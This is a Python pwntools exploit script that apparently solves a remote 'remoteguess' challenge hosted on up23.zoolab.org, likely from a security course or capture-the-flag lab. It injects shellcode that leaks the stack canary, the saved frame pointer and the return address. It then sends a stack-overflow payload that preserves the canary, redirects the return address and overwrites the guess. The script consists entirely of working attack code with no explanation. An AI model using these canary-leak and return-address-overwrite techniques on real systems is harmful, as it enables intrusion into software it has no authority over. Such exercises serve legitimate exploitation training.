#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

#r = process("./remoteguess", shell=True)
#r = remote("localhost", 10816)
r = remote("up23.zoolab.org", 10816)

if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)

shellcode = asm('''
start_shellcode:
    enter  0x30, 0
    mov    rbx, rdi
    mov    rsi, QWORD PTR fs:0x28
    lea    rdi, [rip+str]
    call   rbx
    mov    rsi, QWORD PTR [rbp]
    lea    rdi, [rip+str]
    call   rbx
    mov    rsi, QWORD PTR [rbp+0x08]
    lea    rdi, [rip+str]
    call   rbx
    leave
    ret
str:
    .string "%lu\\n"
''')
payload = bytes(shellcode)

print(disasm(payload))

if payload != None:
    print("** {} bytes to submit".format(len(payload)))
    r.sendlineafter(b'send to me? ', str(len(payload)).encode())
    r.sendlineafter(b'to call? ', '0'.encode())
    r.sendafter(b'bytes): ', payload)
    r.recvline()
    canary = int(r.recvline())
    print(str(canary))
    rbp = int(r.recvline())
    print(str(rbp))
    ra = int(r.recvline()) + 0xAB
    print(str(ra))
    myguess = 1234
    s = (str(myguess).encode('ascii').ljust(0x18, b'\0')+p64(canary)+p64(rbp)+p64(ra)).ljust(0x3C, b'\0')+p32(myguess)
    print(s)
    r.sendafter(b'? ', s)
    # r.sendafter(b'? ', b'100')
    # myguess = 1234;
    # r.sendline(str(myguess).encode('ascii').ljust(0xac-0x90, b'\0') + p32(myguess));

else:
    r.sendlineafter(b'send to me? ', b'0')

r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
